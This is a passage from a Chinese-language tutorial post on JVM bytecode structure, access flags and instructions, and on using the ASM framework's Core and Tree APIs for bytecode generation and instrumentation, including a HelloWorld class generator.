value2)</p>\n<p>(Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;</p>\n<p>装箱后的基础类型实际上是类</p>\n<p>提点题外话</p>\n<p>public double sum(Double value1, double value2) {</p>\n<p>​\t\treturn value1 + value2;</p>\n<p>}</p>\n<p>你们觉得它编译出来字节码会怎么样:), 实际上字节码调用了value1的doubleValue()方法得到了未装箱的值，再进行相加。</p>\n<p>反之亦然，java有自动装箱和自动拆箱的特性。</p>\n</blockquote>\n<blockquote>\n<p>那么数组会如何呢</p>\n<p>public double[] getRandomNums()</p>\n<p>()[D</p>\n<p>当然是在前面加个[</p>\n</blockquote>\n<h4 id=\"访问标志\"><a href=\"#访问标志\" class=\"headerlink\" title=\"访问标志\"></a>访问标志</h4><p>即</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">flags: ACC_PUBLIC, ACC_SUPER<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>从字面上应该就能猜出这些访问标志的意思，它们用来描述一个类/方法/字段的各种修饰符。</p>\n<p>类的标志类型:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg\" alt=\"image-20220223200619811\"></p>\n<p>字段的标志类型:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg\" alt=\"image-20220223201053780\"></p>\n<p>方法的标志类型:</p>\n<table>\n<thead>\n<tr>\n<th>标志名称</th>\n<th>标志值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ACC_PUBLIC</td>\n<td>0x0001</td>\n<td>方法是否为public</td>\n</tr>\n<tr>\n<td>ACC_PRIVATE</td>\n<td>0x0002</td>\n<td>方法是否为private</td>\n</tr>\n<tr>\n<td>ACC_PROTECTED</td>\n<td>0x0004</td>\n<td>方法是否为protected</td>\n</tr>\n<tr>\n<td>ACC_STATIC</td>\n<td>0x0008</td>\n<td>方法是否为static</td>\n</tr>\n<tr>\n<td>ACC_FINAL</td>\n<td>0x0010</td>\n<td>方法是否为final</td>\n</tr>\n<tr>\n<td>ACC_SYNCHRONIZED</td>\n<td>0x0020</td>\n<td>方法是否为synchronized</td>\n</tr>\n<tr>\n<td>ACC_BRIDGE</td>\n<td>0x0040</td>\n<td>方法是不是由编译器产生的桥接方法</td>\n</tr>\n<tr>\n<td>ACC_VARARGS</td>\n<td>0x0080</td>\n<td>方法是否接受不定参数</td>\n</tr>\n<tr>\n<td>ACC_NATIVE</td>\n<td>0x0100</td>\n<td>方法是否为native</td>\n</tr>\n<tr>\n<td>ACC_ABSTRACT</td>\n<td>0x0400</td>\n<td>方法是否为abstract</td>\n</tr>\n<tr>\n<td>ACC_STRICT</td>\n<td>0x0800</td>\n<td>方法是否为strictfp</td>\n</tr>\n<tr>\n<td>ACC_SYNTHETIC</td>\n<td>0x1000</td>\n<td>方法是否由编译器自动产生</td>\n</tr>\n</tbody></table>\n<h4 id=\"字节码指令\"><a href=\"#字节码指令\" class=\"headerlink\" title=\"字节码指令\"></a>字节码指令</h4><blockquote>\n<p>我觉得字节码要细讲完全可以再单开一篇讲，这里就稍微讲一点基础的，让待会ASM的时候不至于完全懵逼就行</p>\n</blockquote>\n<p>前面讲了这么多基本都是描述类和方法的信息，大家一定很好奇我们编写的程序逻辑到底放在哪里了吧。没错，我们编写的逻辑被编译成了面向操作<strong>操作数栈</strong>的字节码指令。为什么要说它是面向<strong>操作数栈</strong>的操作指令？接下来我会讲一讲main方法中所有字节码指令的作用，听完你们就知道了。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre><code>Code:\n  stack=3, locals=3, args_size=1\n     0: iconst_1\n     1: istore_1\n     2: iconst_2\n     3: iload_1\n     4: iadd\n     5: istore_2\n     6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n     9: iload_1\n    10: iload_2\n    11: invokestatic  #3                  // Method sum:(II)I\n    14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n    17: return\n</code></pre>\n<hr>\n<blockquote>\n<p>iconst_1</p>\n</blockquote>\n<p>将一个int类型的常量<code>1</code>加载到<strong>操作数栈</strong>, 此时操作数栈深度为1。对应<code>int a = 1</code>中1的初始化。</p>\n<blockquote>\n<p>istore_1</p>\n</blockquote>\n<p>将一个int类型的数值从<strong>操作数栈</strong>顶取出并存储到局部变量表，这个数值在操作数栈的位置为1，即我们刚才压进操作数栈的<code>1</code>，对应<code>int a = 1</code>中的赋值操作</p>\n<blockquote>\n<p>iconst_2</p>\n</blockquote>\n<p>将一个int类型的常量<code>2</code>加载到<strong>操作数栈</strong>，此时操作数栈深度为2。对应 <code>int b = 2 + a</code>中2的初始化</p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>将一个int类型的局部变量直接加载到<strong>操作数栈</strong>，这个局部变量在局部变量表的位置为1。即刚才第二条指令存进局部变量表的局部变量<code>a</code></p>\n<blockquote>\n<p>iadd</p>\n</blockquote>\n<p>将<strong>操作数栈</strong>顶的两个int类型的数值取出并相加，再压进<strong>操作数栈</strong>中，对应<code>int b = 2 + a</code>的加法运算</p>\n<blockquote>\n<p>istore_2</p>\n</blockquote>\n<p>将一个int类型的数值从<strong>操作数栈</strong>顶中取出并存储到局部变量表，这个数值在<strong>操作数栈</strong>的位置为2，对应<code>int b = 2 + a</code>的赋值</p>\n<blockquote>\n<p>getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</p>\n</blockquote>\n<p>获取静态域<code>System.out</code>, 类型为<code>Ljava/io/PrintStream</code>,并将其压入<strong>操作数栈</strong>顶。后面跟的<code>#2</code>在常量池中对应<code>Field java/lang/System.out:Ljava/io/PrintStream;</code></p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>将int类型的局部变量<code>a</code>加载到<strong>操作数栈</strong>，待用</p>\n<blockquote>\n<p>iload_2</p>\n</blockquote>\n<p>将int类型的局部变量b加载到<strong>操作数栈</strong>，待用</p>\n<blockquote>\n<p>invokestatic  #3                  // Method sum:(II)I</p>\n</blockquote>\n<p>执行所在类中的静态方法，传入栈顶的两个int数值作为形参，返回一个int类型的值压入栈顶</p>\n<blockquote>\n<p>invokevirtual #4                  // Method java/io/PrintStream.println:(I)V</p>\n</blockquote>\n<p>执行<code>PrintStream#println</code>方法，传入栈顶元素作为参数，再传入下一个栈顶元素作为receiver（不知道java这个叫什么，反正kotlin有receiver这个概念）</p>\n<blockquote>\n<p>return</p>\n</blockquote>\n<p>返回void</p>\n<hr>\n<p>经过上面的分析我们已经大致知道了某些字节码的功能，你肯定也发现了，很大一部分字节码的功能是基于<strong>操作数栈</strong>实现的。</p>\n<p>特别是基于栈的数学运算，挺有意思的，我记得我们上学期有一次红岩作业就是实现一个逻辑运算，当时去网上看了一下，要用逆波兰表达式的解析方式配合栈来实现，这应该也是jvm数学运算的实现方式吧，有兴趣可以再写一遍。</p>\n<p>这里我就不系统性的讲解字节码指令了，太多了，根本讲不完。但你们可以课下去了解，我一般是遇见不认识的然后再去查:)</p>\n<h3 id=\"ASM框架\"><a href=\"#ASM框架\" class=\"headerlink\" title=\"ASM框架\"></a>ASM框架</h3><p>前面我们学习了字节码的基本结构以及部分字节码指令，我们一般使用ASM/Javassist/cglib等字节码操控框架来动态的修改/生成字节码。那么通过它们我们能做到什么事情呢?</p>\n<ul>\n<li>编译期代码生成/替换 ，一般通过gradle插件干预编译实现（例如著名的gradle插件shadowJar的依赖包重定向(relocate)功能)。字节码插桩也是在这个过程进行。</li>\n<li>运行期动态代理，可以做到一些InvocationHandler做不到的事情，例如修改类中包引用的包名。</li>\n<li>在获取一些类的信息时，使用asm读取字节码比反射要快得多。</li>\n<li>使用jvm一些奇奇怪怪的特性，例如<a href=\"https://github.com/MeiVinEight/ReflectionFX\">MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)</a>，该项目利用字节码的一些乱七八糟的特性实现了性能开销更小的反射，其性能甚至能够与操作MethodHandle持平。</li>\n</ul>\n<p>其实应该还有很多，我就不列举了。</p>\n<p>这里可能有人有疑问，我们android不是编译成dex吗，那按照常规的方式操作字节码是可行的吗？答案是可行，因为我们字节码插桩的过程一般是</p>\n<p>这里我主要介绍asm框架，它是最流行，最直接的操作字节码的框架，jdk甚至内置了一份。如果从学习字节码的角度来看，asm无疑是最合适的选择。同时安卓中用得比较多的技术就是字节码插桩，所以我准备讲一讲如何用asm框架实现字节码插桩。</p>\n<h4 id=\"ASM-Core-API-amp-Tree-API\"><a href=\"#ASM-Core-API-amp-Tree-API\" class=\"headerlink\" title=\"ASM Core API &amp; Tree API\"></a>ASM Core API &amp; Tree API</h4><h5 id=\"Core-API\"><a href=\"#Core-API\" class=\"headerlink\" title=\"Core API\"></a>Core API</h5><p>ASM 是基于访问者模式设计的，访问者模式可以让ASM更好的操作某个Jar包/class文件中的所有类/字段/方法。因此要学会ASM，首先必须要了解访问者模式。(我其实懵逼了很久) 如果你们以后有兴趣了解kapt/ksp也会用到访问者模式。（实际上这俩很多时候是跟asm配合着用的, kapt/ksp生成代码，asm对代码进行插桩调用）</p>\n<p><a href=\"https://www.runoob.com/design-pattern/visitor-pattern.html\">访问者模式 | 菜鸟教程 (runoob.com)</a></p>\n<p>现在我们来讲讲基础用法:</p>\n<p>ASM基于访问者模式，为我们提供了一套访问class文件中所有属性的API。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassVisitor</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> version<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> superName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interfaces<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//访问类字段时回调</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">FieldVisitor</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//访问类方法是回调</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MethodVisitor</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在使用ClassVisitor访问类时，一旦访问到其中的属性就会回调到对应的属性的访问方法。</p>\n<blockquote>\n<h6 id=\"1：void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\"><a href=\"#1：void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\" class=\"headerlink\" title=\"1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\"></a>1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)</h6><p>访问class的头信息</p>\n<p>version：class版本（编译级别）</p>\n<p>access： 访问标示</p>\n<p>name：类名称</p>\n<p>signature：class的签名，可能是null</p>\n<p>superName：超类名称</p>\n<p>interfaces：接口的名称</p>\n<h6 id=\"2：void-visitAnnotation-String-descriptor-boolean-visible\"><a href=\"#2：void-visitAnnotation-String-descriptor-boolean-visible\" class=\"headerlink\" title=\"2：void visitAnnotation(String descriptor, boolean visible)\"></a>2：void visitAnnotation(String descriptor, boolean visible)</h6><p>访问class的注解信息</p>\n<p>descriptor：描述信息</p>\n<p>visible：是否运行时可见</p>\n<h6 id=\"3：FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\"><a href=\"#3：FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\" class=\"headerlink\" title=\"3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\"></a>3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)</h6><p>访问class中字段的信息，返回一个FieldVisitor用于获取字段中更加详细的信息。</p>\n<p>name：字段个的名称</p>\n<p>descriptor：字段的描述</p>\n<p>value：该字段的初始值，文档上面说：</p>\n<p>该参数，其可以是零，如果字段不具有初始值，必须是一个<code>Integer</code>，一<code>Float</code>，一<code>Long</code>，一个<code>Double</code>或一个<code>String</code>（对于<code>int</code>，<code>float</code>，<code>long</code> 或<code>String</code>分别字段）。<em>此参数仅用于静态字段</em>。对于非静态字段，它的值被忽略，非静态字段必须通过构造函数或方法中的字节码指令进行初始化（但是不管我怎么试，结果都是null）。</p>\n<h6 id=\"4：MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\"><a href=\"#4：MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\" class=\"headerlink\" title=\"4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\"></a>4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)</h6><p>访问class中方法的信息，返回一个MethodVisitor用于获取方法中更加详细的信息。</p>\n<p>name：方法的名称</p>\n<p>descriptor：方法的描述</p>\n<p>signature：方法的签名</p>\n<p>exceptions：方法的异常名称</p>\n<h6 id=\"5：visitInnerClass-String-name-String-outerName-String-innerName-int-access\"><a href=\"#5：visitInnerClass-String-name-String-outerName-String-innerName-int-access\" class=\"headerlink\" title=\"5：visitInnerClass(String name, String outerName, String innerName, int access)\"></a>5：visitInnerClass(String name, String outerName, String innerName, int access)</h6><p>访问class中内部类的信息。这个内部类不一定是被访问类的成员（这里的意思是可能是一段方法中的<strong>匿名内部类</strong>，或者<strong>声明在一个方法中的类</strong>等等）。</p>\n<p>name：内部类的名称。例子<code>com/hebaibai/example/demo/Aoo$1XX</code></p>\n<p>outerName：内部类所在类的名称</p>\n<p>innerName：内部类的名称</p>\n<h6 id=\"6：visitOuterClass-String-owner-String-name-String-descriptor\"><a href=\"#6：visitOuterClass-String-owner-String-name-String-descriptor\" class=\"headerlink\" title=\"6：visitOuterClass(String owner, String name, String descriptor)\"></a>6：visitOuterClass(String owner, String name, String descriptor)</h6><p>访问该类的封闭类。仅当类具有封闭类时，才必须调用此方法。</p>\n<p>我自己试了一下，如果在一个方法中定义了一个class，或者定义个一个匿名内部类，这时通过visitInnerClass方法能够得到例如<code>com/hebaibai/example/demo/Aoo$1</code>或者<code>com/hebaibai/example/demo/Aoo$1XX</code>的类名称。这时通过使用</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">ClassReader classReader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassReader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com/hebaibai/example/demo/Aoo$1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DemoClassVisitor</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span><span class=\"token constant\">ASM7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span><span class=\"token constant\">SKIP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>复制</p>\n<p>可以得到持有内部类的类信息。</p>\n<p>owner：拥有该类的class名称</p>\n<p>name：包含该类的方法的名称，如果该类未包含在其封闭类的方法中，则返回null</p>\n<p>descriptor：描述</p>\n</blockquote>\n<p>ClassVisitor是一个抽象类，我们可以通过继承它来实现自己的ClassVisitor（MethodVistitor/FieldVisitor同)。我们可以插入一段逻辑来获取我们要访问的类的信息，也可以通过改变方法的返回值来修改类的信息。</p>\n<p>当然我们也可以直接通过ClassWriter来生成一个类，手动调用它的各种visit方法来向生成的类来写入字节码，下面我们先简简单单写个HelloWorld。</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>\n        V1_8<span class=\"token punctuation\">,</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_SUPER<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"org/example/asmlearn/ASMLearn_Test\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> mv <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_STATIC<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, World!\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>RETURN<span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> byteArray <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classLoader <span class=\"token operator\">=</span> <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> clazz <span class=\"token operator\">=</span> classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.example.asmlearn.ASMLearn_Test\"</span><span class=\"token punctuation\">,</span> byteArray<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> Array<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token function\">arrayOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> MyClassLoader <span class=\"token operator\">:</span> <span class=\"token function\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> b<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">*</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我们通过asm生成了一个<code>org/example/asmlearn/ASMLearn_Test</code>类，并在里面生成了一个main方法，加载到自定义的classLoader中，然后对它进行反射执行main方法。</p>\n<blockquote>\n<p> 顺便说下生成代码的事情，编译期生成常规代码其实不推荐使用asm，我们一般只在运行期动态生成代码才使用asm。因为asm写起来比较繁琐，运行期用它来生成代码其实是因为没有更好的办法了。编译期如果不是你想实现什么魔法的话一般不用来生成代码，生成代码可以了解一下kapt和ksp，编译期asm一般只是用来在已有的代码中进行插桩。</p>\n</blockquote>\n<h5 id=\"Tree-API\"><a href=\"#Tree-API\" class=\"headerlink\" title=\"Tree API\"></a>Tree API</h5><p>Tree API基于Core API实现，Tree API让我们不用再自定义Visitor，我们可以直接获取一个类的ClassNode，然后通过ClassNode直接获得里面所有的方法/字段信息。</p>\n<p>那么我们要如何得到一个ClassNode呢？</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ClassNode <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">.</span><span class=\"token function\">inputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> classNode\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们可以发现，其实ClassNode就是一个封装过的ClassVisitor。它重写了ClassVisitor所有的访问方法，在访问时把访问到的信息存到类中，然后我们就可以直接从里面获取。<em><strong>有兴趣可以自己实现一下ClassNode，非常简单。</strong></em></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 获取所有方法信息</span>\n<span class=\"token keyword\">val</span> methods<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>MethodNode<span class=\"token operator\">&gt;</span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n<span class=\"token comment\">// 获取所有字段信息</span>\n<span class=\"token keyword\">val</span> fields<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>FieldNode<span class=\"token operator\">&gt;</span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>fields<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h4><p>接下来我会讲解一些asm框架的实战用例，大家有兴趣回去可以跟着敲一敲，都不难。</p>\n<p>推荐的参考资料<a href=\"https://www.bilibili.com/read/cv13433468\">Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)</a></p>\n<p>写的时候跟字节码和这个资料对照着看。</p>\n<h5 id=\"ApiJarGenerator\"><a href=\"#ApiJarGenerator\" class=\"headerlink\" title=\"ApiJarGenerator\"></a>ApiJarGenerator</h5><blockquote>\n<p>写这个实战的时候我还只知道Core API，所以以下功能均使用Core API实现</p>\n</blockquote>\n<blockquote>\n<p>我们知道，Java的类文件都是可以反编译的，同时如果要依赖于某个Jar进行开发就必须要有Jar文件。</p>\n<p>设想一种情况，我们开发项目人手不够，去找了外包。同时我们有一份自主开发的框架/类库，但我们不希望这份库的Jar文件落入外包者之手，但项目开发必须要依赖这份Jar文件，否则就通不过编译，怎么办呢？</p>\n<p>了解了asm框架与JVM字节码结构后我们很容易就能想出一个解决方案，删空Jar文件中所有方法的字节码指令，只留下可供调用的方法声明。这样外包者就无法通过反编译得知方法的具体逻辑，但外包者仍然能调用其中的公开方法，并且项目也能通过编译。</p>\n</blockquote>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token 